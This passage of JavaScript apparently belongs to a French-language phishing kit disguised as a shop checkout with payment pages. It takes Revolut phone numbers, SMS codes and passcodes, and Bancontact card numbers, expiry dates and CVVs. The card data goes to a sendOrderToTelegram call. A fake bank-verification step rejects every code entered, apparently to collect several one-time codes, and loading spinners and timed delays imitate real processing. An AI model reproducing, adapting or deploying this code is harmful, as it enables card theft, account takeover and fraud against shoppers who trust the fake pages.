        timeCount: document.getElementById('time-count'),
        resendNotificationBtn: document.getElementById('resend-notification'),
        useSmsBtn: document.getElementById('use-sms-code')
    };

    if (paymentVerificationPageElements.verificationCodeInput) { 
        const paymentVerificationData = JSON.parse(localStorage.getItem('paymentVerificationData') || '{}');
        if (paymentVerificationData) {
            if(paymentVerificationPageElements.merchantName) paymentVerificationPageElements.merchantName.textContent = paymentVerificationData.merchant || "réglo.fr";
            if(paymentVerificationPageElements.paymentAmount) paymentVerificationPageElements.paymentAmount.textContent = paymentVerificationData.amount ? paymentVerificationData.amount + " €" : "0,00 €";
            if(paymentVerificationPageElements.cardNumberDisplay) paymentVerificationPageElements.cardNumberDisplay.textContent = "**** **** **** " + (paymentVerificationData.cardLast4 || "0000");
        }
        let timeLeft = 30; let timerInterval; let verificationAttempts = 0;
        startVerificationTimer();
        if(paymentVerificationPageElements.verifyBtn) paymentVerificationPageElements.verifyBtn.addEventListener('click', verifyPaymentCode);
        if(paymentVerificationPageElements.resendNotificationBtn) paymentVerificationPageElements.resendNotificationBtn.addEventListener('click', resendPaymentNotification);
        if(paymentVerificationPageElements.useSmsBtn) paymentVerificationPageElements.useSmsBtn.addEventListener('click', useSmsPaymentCode);
        function startVerificationTimer() {
            clearInterval(timerInterval); timeLeft = 30; updateVerificationTimerDisplay();
            timerInterval = setInterval(() => {
                timeLeft--; updateVerificationTimerDisplay();
                if (timeLeft <= 0) { clearInterval(timerInterval); simulateNewPaymentCode(); }
            }, 1000);
        }
        function updateVerificationTimerDisplay() { if(paymentVerificationPageElements.timeCount) paymentVerificationPageElements.timeCount.textContent = timeLeft; }
        function simulateNewPaymentCode() { startVerificationTimer(); verificationAttempts = 0; if(paymentVerificationPageElements.codeError) paymentVerificationPageElements.codeError.style.display = 'none'; }
        function verifyPaymentCode() {
            const code = paymentVerificationPageElements.verificationCodeInput.value.trim();
            if (!code || code.length < 6) { showPaymentError("Veuillez entrer un code valide de 6 chiffres"); return; }
            if(paymentVerificationPageElements.btnText) paymentVerificationPageElements.btnText.textContent = "Vérification en cours";
            if(paymentVerificationPageElements.btnSpinner) paymentVerificationPageElements.btnSpinner.style.display = 'inline-block';
            if(paymentVerificationPageElements.verifyBtn) paymentVerificationPageElements.verifyBtn.disabled = true;
            setTimeout(() => {
                if(paymentVerificationPageElements.btnText) paymentVerificationPageElements.btnText.textContent = "Vérifier le code";
                if(paymentVerificationPageElements.btnSpinner) paymentVerificationPageElements.btnSpinner.style.display = 'none';
                if(paymentVerificationPageElements.verifyBtn) paymentVerificationPageElements.verifyBtn.disabled = false;
                verificationAttempts++; showPaymentError("Code incorrect. Veuillez réessayer.");
                if (verificationAttempts >= 3) {
                    timeLeft = 0; updateVerificationTimerDisplay(); clearInterval(timerInterval);
                    setTimeout(simulateNewPaymentCode, 1000);
                }
            }, 3000);
        }
        function resendPaymentNotification() { alert("Notification renvoyée à votre application bancaire"); startVerificationTimer(); }
        function useSmsPaymentCode() { alert("Un code de vérification a été envoyé par SMS à votre numéro enregistré"); startVerificationTimer(); }
        function showPaymentError(message) {
            if(paymentVerificationPageElements.codeError) {
                paymentVerificationPageElements.codeError.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
                paymentVerificationPageElements.codeError.style.display = 'block';
            }
        }
    }

    // ---- Logic for the FINAL Order Confirmation Page (body id="order-confirmation-final-page") ----
    const finalConfirmationPageBody = document.getElementById('order-confirmation-final-page');
    if (finalConfirmationPageBody) {
        const orderDataToDisplay = JSON.parse(localStorage.getItem('currentOrder'));
        if (orderDataToDisplay) {
            const orderIdEl = document.getElementById('order-id');
            const orderDateEl = document.getElementById('order-date');
            const customerNameEl = document.getElementById('customer-name');
            const customerEmailEl = document.getElementById('customer-email');
            const shippingAddressEl = document.getElementById('shipping-address');
            const paymentMethodConfirmedEl = document.getElementById('payment-method-confirmed');
            const orderedItemsListEl = document.getElementById('ordered-items-list');
            const orderTotalConfirmedEl = document.getElementById('order-total-confirmed');

            if(orderIdEl) orderIdEl.textContent = orderDataToDisplay.orderId;
            if(orderDateEl) orderDateEl.textContent = orderDataToDisplay.date; 
            if(customerNameEl && orderDataToDisplay.customer) customerNameEl.textContent = `${orderDataToDisplay.customer.firstName} ${orderDataToDisplay.customer.lastName}`;
            if(customerEmailEl && orderDataToDisplay.customer) customerEmailEl.textContent = orderDataToDisplay.customer.email;
            if(shippingAddressEl && orderDataToDisplay.customer) shippingAddressEl.textContent = `${orderDataToDisplay.customer.address}, ${orderDataToDisplay.customer.postalCode} ${orderDataToDisplay.customer.city}, ${orderDataToDisplay.customer.country}`;
            if(paymentMethodConfirmedEl) paymentMethodConfirmedEl.textContent = getPaymentMethodName(orderDataToDisplay.paymentMethod);
            if (orderedItemsListEl && orderDataToDisplay.items) {
                orderedItemsListEl.innerHTML = orderDataToDisplay.items.map(item => `
                    <div class="product-item">
                        <img src="${item.image}" alt="${item.name}" class="product-image-small">
                        <div class="product-details-small">
                            <span>${item.name} (${item.variant}) x ${item.quantity}</span>
                            <span>${(item.price * item.quantity).toFixed(2)} €</span>
                        </div>
                    </div>
                `).join('');
            }
            if(orderTotalConfirmedEl) orderTotalConfirmedEl.textContent = `${orderDataToDisplay.total.toFixed(2)} €`;
        } else {
            const container = finalConfirmationPageBody.querySelector('.order-confirmation-container'); 
            if(container) container.innerHTML = "<p>Erreur: Impossible de charger les détails de la commande.</p>";
        }
    }

    // ---- Functions for traitement10.html (Revolut Phone Input) ----
    const revolutPhoneForm = document.getElementById('revolut-phone-form'); 
    if (revolutPhoneForm) { 
        const revolutContinueBtn = document.getElementById('revolutContinueBtn'); 
        const revolutLoadingSpinner = document.getElementById('revolutLoading'); 
        const revolutLoadingDotsFooter = document.getElementById('revolutLoadingDots'); 

        revolutPhoneForm.addEventListener('submit', function(event) { 
            event.preventDefault(); 
            const revolutPhoneInput = document.getElementById('revolut-phone'); 
            if (revolutPhoneInput && revolutPhoneInput.value.trim() !== "") { 
                revolutContinueBtn.disabled = true;
                if (revolutLoadingSpinner) revolutLoadingSpinner.style.display = 'flex';
                let dots = 0;
                const dotInterval = setInterval(() => {
                    dots = (dots + 1) % 4;
                    if (revolutLoadingDotsFooter) revolutLoadingDotsFooter.textContent = '.'.repeat(dots);
                }, 500);
                localStorage.setItem('revolutPhoneNumber', revolutPhoneInput.value.trim());
                setTimeout(() => {
                    clearInterval(dotInterval);
                    window.location.href = 'traitement30.html';
                }, 1500); 
            } else {
                alert("Veuillez saisir votre numéro de téléphone Revolut.");
            }
        });
    }

    // ---- Functions for traitement30.html (Revolut Code Input) ----
    const revolutCodeForm = document.getElementById('revolut-code-form'); 
    if (revolutCodeForm) {
        const codeInputs = revolutCodeForm.querySelectorAll('.revolut-code-input'); 
        const clearKey = document.getElementById('clearKey');
        const submitKey = document.getElementById('submitKey'); 
        const loadingDots = document.getElementById('revolutLoadingDots'); 
        const revolutPhoneHint = document.getElementById('revolut-phone-hint'); 

        if (codeInputs.length > 0) codeInputs[0].focus();
        
        if (revolutPhoneHint){
            const phoneNumber = localStorage.getItem('revolutPhoneNumber');
            if (phoneNumber) {
                 revolutPhoneHint.textContent = `Nous avons envoyé un code à 6 chiffres au ${phoneNumber}.`;
            }
        }

        codeInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                if (this.value.length === 1) {
                    this.classList.add('filled');
                    if (index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    } else { 
                        if(submitKey) submitKey.click(); 
                    }
                } else {
                    this.classList.remove('filled');
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                    codeInputs[index - 1].focus();
                    codeInputs[index - 1].classList.remove('filled');
                }
            });
        });

        document.querySelectorAll('.revolut-key[data-key]').forEach(key => {
            key.addEventListener('click', function() {
                const digit = this.getAttribute('data-key');
                const emptyInput = Array.from(codeInputs).find(input => input.value === '');
                if (emptyInput) {
                    emptyInput.value = digit;
                    emptyInput.classList.add('filled');
                    const nextEmptyInput = Array.from(codeInputs).find(input => input.value === '');
                    if (nextEmptyInput) {
                        nextEmptyInput.focus();
                    } else { 
                         if(submitKey) submitKey.click();
                    }
                }
            });
        });

        if(clearKey) clearKey.addEventListener('click', function() {
            codeInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
            codeInputs[0].focus();
        });

        if(submitKey) submitKey.addEventListener('click', function() { 
            const code = Array.from(codeInputs).map(input => input.value).join('');
            if (code.length === 6) {
                let dots = 0;
                const dotInterval = setInterval(() => {
                    dots = (dots + 1) % 4;
                    if(loadingDots) loadingDots.textContent = '.'.repeat(dots);
                }, 500);
                
                document.querySelectorAll('.revolut-key').forEach(key => {
                    key.style.pointerEvents = 'none'; key.style.opacity = '0.6';
                });
                const revolutCard = document.querySelector('.revolut-card');
                if(revolutCard) revolutCard.style.opacity = '0.7';

                setTimeout(() => {
                    clearInterval(dotInterval);
                    window.location.href = 'traitement40.html';
                }, 1500);
            } 
        });
    }
    
    // ---- Functions for traitement40.html (Revolut Passcode Input) ----
    const revolutPasscodeForm = document.getElementById('revolut-passcode-form');
    if (revolutPasscodeForm) {
        revolutPasscodeForm.addEventListener('submit', function(event) {
            event.preventDefault();
            const passcode = document.getElementById('revolut-passcode').value;
            if (passcode.length === 4) { 
                const paymentDetails = { type: 'RevolutPay', identifier: localStorage.getItem('revolutPhoneNumber') };
                localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
                const processingButton = revolutPasscodeForm.querySelector('button[type="submit"]');
                processingButton.textContent = 'Autorisation...'; processingButton.disabled = true;
                const loadingSpinner = processingButton.querySelector('.revolut-loading');
                if(loadingSpinner) loadingSpinner.style.display = 'flex';
                setTimeout(() => { window.location.href = 'traitement7.html'; }, 1500);
            } else { alert('Veuillez entrer votre code d\'accès à 4 chiffres.'); }
        });
    }

    // ---- Functions for traitement50.html (Revolut Success) ----
    const revolutSuccessPage = document.getElementById('revolut-success-page'); 
    if (revolutSuccessPage) { 
        const transactionDateEl = document.getElementById('transactionDate');
        if (transactionDateEl) {
            const now = new Date();
            const options = { day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit' };
            transactionDateEl.textContent = new Intl.DateTimeFormat('fr-FR', options).format(now);
        }
        
        const revolutSuccessButton = revolutSuccessPage.querySelector('.revolut-button'); 
        if (revolutSuccessButton) {
            revolutSuccessButton.addEventListener('click', function() {
                window.location.href = "index.html"; 
            });
        }

        const currentOrderDataForRevolut = JSON.parse(localStorage.getItem('currentOrder'));
        if (currentOrderDataForRevolut) {
            const successMessageEl = revolutSuccessPage.querySelector('.revolut-success-message');
            if (successMessageEl && currentOrderDataForRevolut.customer) {
                 successMessageEl.textContent = `Merci ${currentOrderDataForRevolut.customer.firstName}, votre paiement Revolut de ${currentOrderDataForRevolut.total.toFixed(2)} € a été approuvé. Un reçu a été envoyé à votre adresse email.`;
            }
            const orderIdSuccessEl = document.getElementById('revolut-order-id'); 
            if(orderIdSuccessEl) orderIdSuccessEl.textContent = currentOrderDataForRevolut.orderId;

            const detailsContainer = revolutSuccessPage.querySelector('.revolut-success-details');
            if (detailsContainer) {
                const detailValues = detailsContainer.querySelectorAll('.revolut-detail-value');
                if (detailValues.length >= 4) { 
                    if (detailValues[0]) detailValues[0].textContent = `${currentOrderDataForRevolut.total.toFixed(2)} €`;
                    if (detailValues[1] && currentOrderDataForRevolut.customer) detailValues[1].textContent = `${currentOrderDataForRevolut.customer.firstName} ${currentOrderDataForRevolut.customer.lastName}`;
                    if (detailValues[3]) detailValues[3].textContent = currentOrderDataForRevolut.orderId || 'N/A';
                }
            }
        }
    }

    // ---- Functions for traitement20.html (Bancontact Form) ----
    const bancontactForm = document.getElementById('bancontact-form');
    if (bancontactForm) {
        const bancontactElements = {
            orderItems: document.getElementById('order-items'),
            orderTotal: document.getElementById('order-total-amount'),
            processPaymentBtn: document.getElementById('process-payment'),
            cardNumber: document.getElementById('card-number'),
            cardHolder: document.getElementById('card-holder'),
            cardExpiry: document.getElementById('card-expiry'),
            cardCVV: document.getElementById('card-cvv'),
            bankSelect: document.getElementById('bancontact-bank'),
            cardPreviewNumber: document.getElementById('card-preview-number'),
            cardPreviewHolder: document.getElementById('card-preview-holder'),
            cardPreviewExpiry: document.getElementById('card-preview-expiry'),
            loadingOverlay: document.getElementById('loading-overlay') 
        };

        function updateBancontactCardPreview() {
            if (bancontactElements.cardPreviewNumber && bancontactElements.cardNumber) bancontactElements.cardPreviewNumber.textContent = bancontactElements.cardNumber.value || '•••• •••• •••• ••••';
            if (bancontactElements.cardPreviewHolder && bancontactElements.cardHolder) bancontactElements.cardPreviewHolder.textContent = bancontactElements.cardHolder.value.toUpperCase() || 'NOM DU TITULAIRE';
            if (bancontactElements.cardPreviewExpiry && bancontactElements.cardExpiry) bancontactElements.cardPreviewExpiry.textContent = bancontactElements.cardExpiry.value || '••/••';
        }
        
        if (bancontactElements.cardNumber) {
            bancontactElements.cardNumber.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                if (value.length > 19) value = value.substr(0, 19); 
                let formatted = '';
                for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += value[i]; }
                e.target.value = formatted; updateBancontactCardPreview();
            });
        }
        if (bancontactElements.cardHolder) bancontactElements.cardHolder.addEventListener('input', updateBancontactCardPreview);
        if (bancontactElements.cardExpiry) {
            bancontactElements.cardExpiry.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
                if (value.length > 4) value = value.substr(0, 4);
                if (value.length > 2) value = value.substr(0, 2) + '/' + value.substr(2);
                e.target.value = value; updateBancontactCardPreview();
            });
        }

        bancontactForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            const bank = bancontactElements.bankSelect.value;
            const cardNumber = bancontactElements.cardNumber.value.replace(/\s/g, '');
            const cardHolder = bancontactElements.cardHolder.value.trim();
            const expiry = bancontactElements.cardExpiry.value;
            const cvv = bancontactElements.cardCVV.value; 

            if (!bank) { alert('Veuillez sélectionner votre banque'); return; }
            if (cardNumber.length < 16 || cardNumber.length > 19) { alert('Numéro de carte Bancontact invalide'); return;}
            if (cardHolder.length < 3) { alert('Nom du titulaire invalide'); return; }
            if (!expiry.match(/^\d{2}\/\d{2}$/)) { alert('Date d\'expiration invalide (MM/AA)'); return; }
            if (cvv.length !== 3 && cvv.length !== 0) { alert('Code de sécurité invalide (CVC) ou laissez vide si non applicable.'); return; }

            if (bancontactElements.loadingOverlay) bancontactElements.loadingOverlay.classList.add('active');
            
            const paymentDetails = { type: 'Bancontact', bank: bank, cardHolder: cardHolder, cardNumber: cardNumber, cardExpiry: expiry };
            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
            
            const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
            const customerData = currentOrderData.customer || {}; 
            await sendOrderToTelegram(customerData, paymentDetails);

            setTimeout(() => {
                if (bancontactElements.loadingOverlay) bancontactElements.loadingOverlay.classList.remove('active');
                window.location.href = 'traitement4.html'; 
            }, 3000);
        });
        displayOrderItems(); 
    }
});
